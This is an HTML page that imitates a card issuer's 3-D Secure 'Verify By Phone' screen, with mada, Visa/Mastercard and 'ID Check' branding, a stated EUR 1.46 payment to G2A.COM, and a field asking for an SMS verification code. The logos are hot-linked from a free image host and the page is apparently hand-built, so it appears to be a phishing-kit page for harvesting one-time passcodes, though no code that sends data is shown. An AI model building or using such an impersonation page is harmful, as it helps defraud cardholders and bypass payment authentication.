<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Page</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 15px;
            color: #000;
        }

        .container {
            max-width: 450px;
            margin: 0 auto;
        }

        /* الجزء العلوي: سهم الرجوع وكلمة Cancel */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .back-arrow {
            color: #0000FF;
            font-size: 26px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
        }

        .cancel-text {
            font-weight: bold;
            font-size: 15px;
            cursor: pointer;
        }

        /* الشعارات بمقاسات واضحة */
        .logos-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 5px;
        }

        .mada-logo img {
            height: 38px; /* مقاس محسّن للوضوح */
            width: auto;
            display: block;
        }

        .provider-logos {
            text-align: right;
        }

        .provider-logos img {
            height: 32px; /* مقاس محسّن للفيزا والماستركارد */
            width: auto;
            display: block;
            margin-left: auto;
        }

        .id-check-label {
            font-size: 11px;
            color: #666;
            margin-top: 2px;
        }

        hr {
            border: 0;
            border-top: 1px solid #eeeeee;
            margin: 10px 0 25px 0;
        }

        /* النصوص */
        h1 {
            font-family: "Times New Roman", Times, serif;
            font-size: 24px;
            margin-bottom: 25px;
        }

        p {
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        /* منطقة الإدخال */
        .form-area {
            text-align: center;
            margin-top: 40px;
        }

        .input-label {
            color: #888;
            font-size: 14px;
            margin-bottom: 10px;
            display: block;
        }

        input[type="text"] {
            width: 100%;
            max-width: 320px;
            height: 48px;
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            font-size: 20px;
            text-align: center;
            margin-bottom: 25px;
            outline: none;
        }

        .btn-confirm {
            width: 100%;
            background-color: #0000FF;
            color: white;
            border: none;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            text-transform: uppercase;
        }

        .resend-link {
            display: block;
            margin: 35px 0 50px 0;
            color: #0000FF;
            text-decoration: none;
            font-weight: bold;
            font-size: 14px;
        }

        /* الروابط السفلية */
        .footer-links {
            border-top: 1px solid #f8f8f8;
        }

        .footer-item {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            color: #00008B;
            text-decoration: none;
            font-size: 15px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="top-bar">
        <div class="back-arrow">&#10094;</div>
        <div class="cancel-text">Cancel</div>
    </div>

    <div class="logos-row">
        <div class="mada-logo">
            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="mada">
        </div>
        <div class="provider-logos">
            <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" alt="Card Logos">
            <div class="id-check-label">ID Check</div>
        </div>
    </div>

    <hr>

    <h1>Verify By Phone</h1>

    <p>We have sent you a text message with a code to your registered mobile number.</p>
    
    <p>You are paying <strong>G2A.COM</strong> the amount of <strong>EUR 1.46</strong> on 2026/02/15 01:54:11.</p>

    <div class="form-area">
        <label class="input-label">Verification code</label>
        <input type="text" placeholder="">
        <button class="btn-confirm">CONFIRM</button>
        <a href="#" class="resend-link">RESEND CODE</a>
    </div>

    <div class="footer-links">
        <a href="#" class="footer-item">Learn more about authentication <span>+</span></a>
        <a href="#" class="footer-item">Need some help ? <span>+</span></a>
    </div>
</div>

</body>
</html>
